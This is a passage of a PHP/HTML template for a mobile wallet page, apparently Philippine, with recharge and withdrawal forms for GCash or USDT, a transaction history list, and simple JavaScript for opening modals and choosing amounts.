                        <div class="amount-chip" onclick="setAmount(700, this)">₱700</div>
                        <div class="amount-chip" onclick="setAmount(1500, this)">₱1500</div>
                        <div class="amount-chip" onclick="setAmount(3000, this)">₱3000</div>
                    </div>

                    <input type="number" name="deposit_amount" id="depositAmountInput" min="300" value="300" required style="margin-top: 10px;">

                    <button type="submit" class="btn" style="margin-top: 15px;">Confirm Recharge</button>
                    <button type="button" class="btn btn-cancel" onclick="closeModal('rechargeModal')">Cancel</button>
                </form>
            </div>
        </div>

        <div id="withdrawModal" class="modal">
            <div class="modal-content">
                <h3 style="color: #facc15; margin-top: 0;">Request Withdrawal</h3>
                <form method="POST">
                    <input type="hidden" name="action" value="request_withdraw">
                    <label>Amount (₱):</label>
                    <input type="number" name="withdraw_amount" min="100" value="100" required>
                    <label>GCash Number o USDT Wallet:</label>
                    <input type="text" name="user_wallet" placeholder="Ilagay ang GCash # o Address" required>
                    <button type="submit" class="btn" style="margin-top: 10px;">Confirm Withdrawal</button>
                    <button type="button" class="btn btn-cancel" onclick="closeModal('withdrawModal')">Cancel</button>
                </form>
            </div>
        </div>

        <div id="historyModal" class="modal">
            <div class="modal-content">
                <h3 style="color: #facc15; margin-top: 0;">Transaction History</h3>
                <?php if (empty($userTxns)): ?>
                    <p style="font-size: 12px; color: #94a3b8; text-align: center;">Wala ka pang transaksiyon.</p>
                <?php else: ?>
                    <?php foreach (array_reverse($userTxns) as $txn): ?>
                        <div class="history-card">
                            <span class="status-badge status-<?= $txn['status'] ?>"><?= strtoupper($txn['status']) ?></span>
                            <div style="font-weight: bold; color: #f8fafc; font-size: 13px;">
                                <?= strtoupper($txn['type']) ?> - ₱<?= number_format($txn['amount'], 2) ?>
                            </div>
                            <div style="color: #94a3b8; font-size: 11px; margin-top: 4px;">
                                ID: <?= $txn['id'] ?><br>
                                Date: <?= $txn['created_at'] ?>
                            </div>
                        </div>
                    <?php endforeach; ?>
                <?php endif; ?>
                <button type="button" class="btn btn-cancel" onclick="closeModal('historyModal')">Isara</button>
            </div>
        </div>

        <div class="bottom-nav">
            <div class="nav-link active" onclick="window.scrollTo({top: 0, behavior: 'smooth'})">
                <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
                Home
            </div>
            <div class="nav-link" onclick="openModal('historyModal')">
                <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
                Orders
            </div>
            <div class="nav-link" onclick="openModal('rechargeModal')">
                <svg viewBox="0 0 24 24"><path d="M18 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM6 4h5v8l-2.5-1.5L6 12V4z"/></svg>
                Recharge
            </div>
            <div class="nav-link" onclick="openModal('withdrawModal')">
                <svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
                Withdraw
            </div>
            <div class="nav-link" onclick="openNotice()">
                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
                My
            </div>
        </div>

        <script>
            function openModal(id) { document.getElementById(id).style.display = 'flex'; }
            function closeModal(id) { document.getElementById(id).style.display = 'none'; }
            function openNotice() { document.getElementById('noticeModal').style.display = 'flex'; }
            function closeNotice() { document.getElementById('noticeModal').style.display = 'none'; }
            
            function setMethod(method) {
                document.getElementById('paymentMethodInput').value = method;
                if(method === 'GCash') {
                    document.getElementById('methodGCash').className = 'method-card selected';
                    document.getElementById('methodMaya').className = 'method-card';
                } else {
                    document.getElementById('methodMaya').className = 'method-card selected';
                    document.getElementById('methodGCash').className = 'method-card';
                }
            }

            function setAmount(val, el) {
                document.getElementById('depositAmountInput').value = val;
                var chips = document.querySelectorAll('.amount-chip');
                chips.forEach(function(c) { c.className = 'amount-chip'; });
                el.className = 'amount-chip selected';
            }
        </script>
    <?php endif; ?>
</div>

</body>
</html>
